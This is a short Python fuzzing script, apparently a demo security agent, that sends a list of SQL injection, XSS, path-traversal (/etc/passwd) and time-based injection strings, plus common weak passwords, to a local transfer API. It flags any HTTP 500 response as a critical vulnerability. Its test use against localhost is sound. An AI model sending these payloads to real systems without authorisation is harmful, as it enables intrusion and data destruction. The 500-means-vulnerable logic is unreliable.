import requests
import time

ATTACK_KEYWORDS = [
    "admin", "password", "root", "123456", "guest", 
    "admin'--", "select * from users", "drop table users",
    "<script>alert(1)</script>", "admin' #", "' OR '1'='1'",
    "../../etc/passwd", "sleep(5)", "benchmark(1000000)",
    "union select null,null--", "@@version", "' OR 1=1 --"
]

def start_intense_attack():
    print("BugShield Shannon Agent: Starting Deep Fuzzing...")
    requests.post("http://localhost:5000/api/fuzz-start")
    
    for word in ATTACK_KEYWORDS:
        print("Testing payload: " + word)
        requests.post("http://localhost:5000/api/update-payload", json={"payload": word})
        time.sleep(0.4)
        
        response = requests.post("http://localhost:5000/api/transfer", json={"account": word})
        
        if response.status_code == 500:
            print("\nCRITICAL VULNERABILITY FOUND!")
            print("Final Payload: " + word)
            break

if __name__ == "__main__":
    start_intense_attack()
